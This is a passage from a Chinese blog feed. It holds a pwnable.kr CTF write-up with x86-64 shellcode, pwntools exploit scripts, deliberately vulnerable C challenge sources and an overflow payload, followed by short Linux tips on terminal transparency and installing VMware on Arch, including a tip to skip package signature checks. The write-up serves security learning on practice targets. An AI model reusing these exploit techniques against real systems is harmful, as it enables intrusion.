f6                xor    rsi,rsi</span><br><span class="line">   f:   <span class="number">48</span> <span class="number">31</span> ff                xor    rdi,rdi</span><br><span class="line">  <span class="number">12</span>:   <span class="number">48</span> <span class="number">31</span> ed                xor    rbp,rbp</span><br><span class="line">  <span class="number">15</span>:   <span class="number">4</span>d <span class="number">31</span> c0                xor    r8,r8</span><br><span class="line">  <span class="number">18</span>:   <span class="number">4</span>d <span class="number">31</span> c9                xor    r9,r9</span><br><span class="line">  <span class="number">1</span>b:   <span class="number">4</span>d <span class="number">31</span> d2                xor    r10,r10</span><br><span class="line">  <span class="number">1</span>e:   <span class="number">4</span>d <span class="number">31</span> db                xor    r11,r11</span><br><span class="line">  <span class="number">21</span>:   <span class="number">4</span>d <span class="number">31</span> e4                xor    r12,r12</span><br><span class="line">  <span class="number">24</span>:   <span class="number">4</span>d <span class="number">31</span> ed                xor    r13,r13</span><br><span class="line">  <span class="number">27</span>:   <span class="number">4</span>d <span class="number">31</span> f6                xor    r14,r14</span><br><span class="line">  <span class="number">2</span>a:   <span class="number">4</span>d <span class="number">31</span> ff                xor    r15,r15</span><br></pre></td></tr></table></figure><p>题目要求是写入一个1000字节以内的64位shellcode来读取那个文件名很长(231字节)的文件以获得flag</p><p>并且只能使用 <a href="http://www.man7.org/linux/man-pages/man2/syscalls.2.html" target="_blank" rel="noopener">linux syscalls</a></p><p>查阅相关资料, 知道调用syscall的方法是 (以一段shellcode为例)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* 将 b&apos;/bin///sh\x00&apos; 入栈</span><br><span class="line">*  多出来的&apos;/&apos;是为了对齐</span><br><span class="line">*  故意将&apos;h&apos;留到下一行</span><br><span class="line">*  从而实现shellcode没有出现\x00</span><br><span class="line">*  而字符串末尾有\x00的效果</span><br><span class="line">*/</span><br><span class="line">push 0x68</span><br><span class="line">mov rax, 0x732f2f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line">/* 将对应的系统调用号送入rax寄存器, 这里用了pwntools内置常量</span><br><span class="line">*  传参的顺序同64位函数调用</span><br><span class="line">*/</span><br><span class="line">mov rax, SYS_execve /* 0x3b */</span><br><span class="line">mov rdi, rsp // 传入当前栈指针, 即为字符串的地址</span><br><span class="line">syscall // 调用</span><br></pre></td></tr></table></figure><p>那么大概思路应该是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push filename</span><br><span class="line"></span><br><span class="line">fd = open(filename, <span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">read(fd, esp, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">1</span>, esp, <span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><p>用python实现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> platform <span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'MANJARO'</span> <span class="keyword">in</span> platform():</span><br><span class="line">    io = process(<span class="string">'./asm'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">'0'</span>, <span class="number">9026</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string"> * rdi = "blablablablabla"</span></span><br><span class="line"><span class="string"> * r15 = open(rdi, O_RDONLY)</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">mov rax, 0x676e6f306f306f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x306f306f306f306f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x3030303030303030</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x303030306f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f6f6f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f6f6f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f3030303030</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x3030303030303030</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x3030303030303030</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x303030306f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f6f6f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f6f6f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f6f6f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f6f6f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f6f6f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f6f6f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f6f6f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f6f6f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6f6f6f6f6f6f6f6f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6c5f797265765f73</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x695f656d616e5f65</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x6c69665f6568745f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x7972726f732e656c</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x69665f736968745f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x646165725f657361</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x656c705f656c6966</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x5f67616c665f726b</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x2e656c62616e7770</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x5f73695f73696874</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, SYS_open</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">mov rsi, O_RDONLY</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov r15, rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* read(r15, rsp, 23) */</span></span><br><span class="line"><span class="string">mov rax, SYS_read</span></span><br><span class="line"><span class="string">mov rdi, r15</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* write(1, rsp, 23) */</span></span><br><span class="line"><span class="string">mov rax, SYS_write</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">payload = asm(code)</span><br><span class="line">io.sendlineafter(<span class="string">'give me your x64 shellcode: '</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>flag: <code>Mak1ng_shelLcodE_i5_veRy_eaSy</code></p><p>看了一下大佬们的WP, 又学到了一招</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode += shellcraft.amd64.pushstr(<span class="string">'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span>)</span><br><span class="line">shellcode += shellcraft.amd64.open(<span class="string">'rsp'</span>, <span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.amd64.read(<span class="string">'rax'</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.amd64.write(<span class="number">1</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure><h1 id="unlink-TODO"><a href="#unlink-TODO" class="headerlink" title="unlink (TODO)"></a>unlink (TODO)</h1><blockquote><p>Daddy! how can I exploit unlink corruption?</p><p>ssh <a href="mailto:unlink@pwnable.kr" target="_blank" rel="noopener">unlink@pwnable.kr</a> -p2222 (pw: guest)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unlink@ubuntu:~$ ls</span><br><span class="line">flag  intended_solution.txt  unlink  unlink.c</span><br></pre></td></tr></table></figure><p>unlink.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">    OBJ* BK;</span><br><span class="line">    OBJ* FD;</span><br><span class="line">    BK=P-&gt;bk;</span><br><span class="line">    FD=P-&gt;fd;</span><br><span class="line">    FD-&gt;bk=BK;</span><br><span class="line">    BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">    OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">    OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">    OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">    A-&gt;fd = B;</span><br><span class="line">    B-&gt;bk = A;</span><br><span class="line">    B-&gt;fd = C;</span><br><span class="line">    C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</span><br><span class="line">    <span class="comment">// heap overflow!</span></span><br><span class="line">    gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// exploit this unlink!</span></span><br><span class="line">    unlink(B);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="blukat-TODO"><a href="#blukat-TODO" class="headerlink" title="blukat (TODO)"></a>blukat (TODO)</h1><blockquote><p>Sometimes, pwnable is strange...<br>hint: if this challenge is hard, you are a skilled player.</p><p>ssh <a href="mailto:blukat@pwnable.kr" target="_blank" rel="noopener">blukat@pwnable.kr</a> -p2222 (pw: guest)</p></blockquote><p>blukat.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span>* key = <span class="string">"3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+"</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc_flag</span><span class="params">(<span class="keyword">char</span>* s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(s); i++)&#123;</span><br><span class="line">                flag[i] = s[i] ^ key[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        FILE* fp = fopen(<span class="string">"/home/blukat/password"</span>, <span class="string">"r"</span>);</span><br><span class="line">        fgets(password, <span class="number">100</span>, fp);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"guess the password!\n"</span>);</span><br><span class="line">        fgets(buf, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(password, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"congrats! here is your flag: "</span>);</span><br><span class="line">                calc_flag(password);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong guess!\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/tmp/blukat&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>开了 Canary 看起来很难的样子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwnlib.gdb.context.terminal = ['konsole', '-e']</span></span><br><span class="line">context(log_level=<span class="string">'DEBUG'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">io = process(<span class="string">'./blukat'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./blukat'</span>)</span><br><span class="line"></span><br><span class="line">pwnlib.gdb.attach(io, <span class="string">'b fgets'</span>)</span><br><span class="line"></span><br><span class="line">calc_flag_addr = elf.symbols[<span class="string">'calc_flag'</span>]</span><br><span class="line">password_addr  = elf.symbols[<span class="string">'password'</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'\x90'</span> * (<span class="number">100</span> + <span class="number">0x4</span> + <span class="number">0x8</span>), calc_flag_addr, password_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h1 id="horcruses-TODO"><a href="#horcruses-TODO" class="headerlink" title="horcruses (TODO)"></a>horcruses (TODO)</h1><blockquote><p>Voldemort concealed his splitted soul inside 7 horcruxes.<br>Find all horcruxes, and ROP it!<br>author: jiwon choi</p><p>ssh <a href="mailto:horcruxes@pwnable.kr" target="_blank" rel="noopener">horcruxes@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Toddler&amp;#39;s Bottle vey&lt;/p&gt;
&lt;p&gt;包含了 Toddler&amp;#39;s Bottle 这一节的除了 UAF 和 unlink 以外的 writeup.&lt;br&gt;(一看就知道还不会利用堆漏洞)&lt;/p&gt;
&lt;p&gt;更: 又多了 blukat 和 horcruses......&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="https://www.aloxaf.com/categories/writeup/"/>
    
    
      <category term="pwn" scheme="https://www.aloxaf.com/tags/pwn/"/>
    
      <category term="ctf" scheme="https://www.aloxaf.com/tags/ctf/"/>
    
      <category term="writeup" scheme="https://www.aloxaf.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>解决Gnome终端无法设置透明度的问题</title>
    <link href="https://www.aloxaf.com/2017/12/gnomre-terminal-transparency/"/>
    <id>https://www.aloxaf.com/2017/12/gnomre-terminal-transparency/</id>
    <published>2017-12-26T02:47:23.000Z</published>
    <updated>2018-08-11T06:23:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>将下列代码加入到shell的初始化脚本中即可</p><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> from https://gist.github.com/brickgao/beb1c5d300c26aa2be31</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> append it to your .zshrc</span></span><br><span class="line">if [ -n "$WINDOWID" ]; then</span><br><span class="line">TRANSPARENCY_HEX=$(printf 0x%x $((0xffffffff * 90 / 100)))</span><br><span class="line">xprop -id "$WINDOWID" -f _NET_WM_WINDOW_OPACITY 32c -set _NET_WM_WINDOW_OPACITY "$TRANSPARENCY_HEX"</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash">+end_src</span></span><br></pre></td></tr></table></figure><p>相关讨论: <a href="https://www.reddit.com/r/linux/comments/69571g/did_gnome_team_just_remove_the_transparent/" target="_blank" rel="noopener">did_gnome_team_just_remove_the_transparent</a></p><p>P.S.</p><p>然而随着某次更新, 这个方法也失去了作用.</p><p>经测试是 <code>$WINDOWID</code> 不能获取到当前窗口的 PID 了, 换个方法获取 PID 的话还是能透明, 不过我懒 (<del>正宗懒军</del>),<br>索性换用 gnome-terminal-fedora </p><p>PSS.</p><p>换了 KDE, 感觉良好. [2018-8]</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;将下列代码加入到shell的初始化脚本中即可&lt;/p&gt;
    
    </summary>
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
      <category term="gnome" scheme="https://www.aloxaf.com/tags/gnome/"/>
    
  </entry>
  
  <entry>
    <title>在ArchLinux上安装VMware</title>
    <link href="https://www.aloxaf.com/2017/11/install_vmware_on_archlinux/"/>
    <id>https://www.aloxaf.com/2017/11/install_vmware_on_archlinux/</id>
    <published>2017-11-30T00:00:12.000Z</published>
    <updated>2017-11-30T00:00:12.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.建立 init.d 文件夹, 尽管对于arch 来说没有卵用</span></span><br><span class="line">sudo mkdir /etc/init.d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.安装内核头文件, 因为接下来需要编译内核模块, 以内核4.14为例</span></span><br><span class="line">sudo pacman -S linux414-headers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.安装ncurses5-compat-libs, 因为vm-tools依赖ncurses5, 而arch只有ncurses6</span></span><br><span class="line"><span class="comment"># 这个地方如果GPG校验失败的话, 就添加 --m-arg "--skipchecksums --skippgpcheck"</span></span><br><span class="line">yaourt -S ncurses5-compat-libs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.下载VMware Linux版, 得到一个.bundle文件</span></span><br><span class="line"><span class="comment"># 以root身份运行之</span></span><br><span class="line">sudo chmod +x xxx.bundle</span><br><span class="line">sudo ./xxx.bundle</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一开始每次更新完内核都要使用如下命令重新编译内核模块的</span></span><br><span class="line"><span class="comment"># 不过某次更新以后变成自动弹出窗口请求root权限进行编译, 就不用执行下面的代码了</span></span><br><span class="line"><span class="comment"># sudo vmware-modconfig --console --install-all</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=
      
    
    </summary>
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
</feed>
